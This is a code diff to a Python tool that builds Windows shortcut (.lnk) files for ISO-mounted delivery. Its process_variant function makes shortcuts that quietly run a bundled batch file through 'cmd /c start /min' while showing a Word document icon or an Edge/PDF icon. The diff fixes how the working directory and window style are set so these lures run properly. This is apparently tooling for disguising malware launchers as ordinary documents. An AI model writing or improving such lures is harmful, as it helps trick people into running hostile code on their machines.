@@ -361,17 +361,17 @@ def _build_lnk_binary(target, arguments, icon_location, icon_index, working_dir,
     header_size = 0x0000004C
     clsid = b'\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46'
 
-    # LinkFlags: HasLinkTargetIDList | HasLinkInfo | HasRelativePath |
-    #            HasWorkingDir | HasArguments | HasIconLocation | IsUnicode
+    # LinkFlags
     link_flags = (
         0x00000001 |  # HasLinkTargetIDList
         0x00000002 |  # HasLinkInfo
         0x00000008 |  # HasRelativePath
-        0x00000010 |  # HasWorkingDir
         0x00000020 |  # HasArguments
         0x00000040 |  # HasIconLocation
         0x00000080    # IsUnicode
     )
+    if working_dir:
+        link_flags |= 0x00000010  # HasWorkingDir
     file_attributes = 0x00000020  # FILE_ATTRIBUTE_ARCHIVE
     creation_time = 0
     access_time = 0
@@ -482,8 +482,9 @@ def _build_lnk_binary(target, arguments, icon_location, icon_index, working_dir,
 
     # RelativePath
     _write_string_data('.\\' + os.path.basename(target))
-    # WorkingDir
-    _write_string_data(working_dir)
+    # WorkingDir (only if set)
+    if working_dir:
+        _write_string_data(working_dir)
     # Arguments
     _write_string_data(arguments)
     # IconLocation
@@ -492,19 +493,28 @@ def _build_lnk_binary(target, arguments, icon_location, icon_index, working_dir,
     return buf.getvalue()
 
 
-def create_lnk(out_path, target, arguments, icon_location, icon_index, working_dir='.', window_style=7):
-    """Create a Windows .lnk shortcut file."""
+def create_lnk(out_path, target, arguments, icon_location, icon_index, working_dir=None, window_style=1):
+    """Create a Windows .lnk shortcut file.
+
+    working_dir=None means don't set HasWorkingDir — Windows will use the LNK's
+    parent directory as CWD, which is correct for ISO-mounted shortcuts.
+    """
     if HAS_PYLNK3:
-        # pylnk3.for_file() handles IDList / LinkInfo internals automatically
-        lnk = pylnk3.for_file(
+        kwargs = dict(
             target_file=target,
             lnk_name=out_path,
             arguments=arguments,
             icon_file=icon_location,
             icon_index=icon_index,
-            work_dir=working_dir,
-            window_mode='Minimized',  # maps to ShowCommand=7 (SW_SHOWMINNOACTIVE)
         )
+        if working_dir:
+            kwargs['work_dir'] = working_dir
+        lnk = pylnk3.for_file(**kwargs)
+        # Patch ShowCommand in the written file (pylnk3 doesn't expose it directly)
+        if window_style != 1 and os.path.exists(out_path):
+            with open(out_path, 'r+b') as f:
+                f.seek(60)
+                f.write(struct.pack('<I', window_style))
     else:
         data = _build_lnk_binary(target, arguments, icon_location, icon_index, working_dir, window_style)
         with open(out_path, 'wb') as f:
@@ -675,8 +685,8 @@ def process_variant(variant_dir, output_dir):
             arguments=f'/c "start /min .\\{w_bat}"',
             icon_location='%SystemRoot%\\System32\\SHELL32.dll',
             icon_index=1,
-            working_dir='.',
-            window_style=7,
+            working_dir=None,
+            window_style=1,
         )
         print(f'      LNK: {lnk_name} (Word icon)')
 
@@ -759,8 +769,8 @@ def process_variant(variant_dir, output_dir):
             arguments=f'/c "start /min .\\{p_bat}"',
             icon_location='%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe',
             icon_index=11,
-            working_dir='.',
-            window_style=7,
+            working_dir=None,
+            window_style=1,
         )
         print(f'      LNK: {lnk_name_pdf} (Edge icon)')
 
